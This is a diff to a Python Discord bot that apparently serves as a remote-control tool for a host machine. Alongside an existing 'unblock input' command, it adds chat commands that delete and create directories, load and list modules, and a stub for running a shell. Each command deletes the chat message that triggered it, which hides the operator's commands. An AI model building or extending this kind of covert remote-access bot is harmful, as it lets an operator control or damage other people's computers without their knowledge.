@@ -230,7 +230,60 @@ async def on_message(message):
         embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
+    #DELETE DIR
+    if message.content.startswith(".deletedir"):
+        await message.delete()
+        try:
+            os.rmdir(message.content.replace(".deletedir ", ""))
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Delete Directory", description="Failed to delete directory. Usage: ``.deletedir <FULL DIRECTORY PATH>``\nIf you want to delete files use the ``.delete`` command!", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="Delete Directory",description=f"Directory {message.content.replace('.deletedir ', '')} deleted.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+    
+    #CREATE DIR
+    if message.content.startswith(".createdir"):
+        await message.delete()
+        try:
+            os.mkdir(message.content.replace(".createdir ", ""))
+        except Exception as e:
+            print(e)
+            embed = discord.Embed(title="Create Directory", description="Failed to create directory. Usage: ``.createdir <FULL DIRECTORY PATH>``", color=0x00ff00)
+            await message.channel.send(embed=embed)
+            return
+        embed = discord.Embed(title="Create Directory",description=f"Directory {message.content.replace('.createdir ', '')} created.", color=0x00ff00)
+        await message.channel.send(embed=embed)
+
+    #RUN MODULES
+    if message.content.startswith(".modules"):
+        arg = message.content.replace(".modules ", "")
+        if arg == "load":
+            await message.delete()
+            try:
+                load_modules()
+            except Exception as e:
+                print(e)
+                embed = discord.Embed(title="Modules", description="Failed to load modules.", color=0x00ff00)
+                await message.channel.send(embed=embed)
+                return
+            embed = discord.Embed(title="Modules", description="Modules loaded.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+        if arg == "list":
+            await message.delete()
+            modules = ""
+            for module in os.listdir(modules_path):
+                modules += f"{module}\n"
+            embed = discord.Embed(title="Modules", description=modules, color=0x00ff00)
+            await message.channel.send(embed=embed)
+        else:
+            await message.delete()
+            embed = discord.Embed(title="Modules", description="Invalid argument.", color=0x00ff00)
+            await message.channel.send(embed=embed)
+
+    #RUN SHELL
+
 token = sys.argv[1]
 client.run(token)
 #use py main.py <token> to run
-
